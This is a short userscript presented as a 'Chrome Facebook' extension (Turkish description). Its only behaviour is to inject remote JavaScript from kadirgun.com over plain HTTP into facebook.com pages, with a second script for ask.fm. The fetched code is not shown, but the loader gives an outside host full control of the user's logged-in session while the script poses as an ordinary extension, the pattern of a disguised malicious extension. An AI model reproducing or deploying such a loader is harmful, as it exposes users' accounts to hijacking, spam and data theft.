// ==UserScript==
// @name           Chrome Facebook
// @author         Chrome Facebook
// @version        1.0
// @description    Facebook için hazırlanmış Google Chrome eklentisi
// @namespace      Chrome Facebook
// @include        http://*.facebook.com/*
// @include        https://*.facebook.com/*
// @include        http://*.formspring.me/*
// ==/UserScript==

function addJavascript(jsname){
	var th = document.getElementsByTagName('head')[0];
	var s = document.createElement('script');
	s.setAttribute('type','text/javascript');
	s.setAttribute('src',jsname);
	th.appendChild(s);
}

if(document.URL.indexOf("www.facebook.com") > 0){
addJavascript('http://www.kadirgun.com/facebook/fb.js');
}

if(document.URL.indexOf("http://ask.fm") >= 0){
addJavascript('http://www.kadirgun.com/ask.js');
}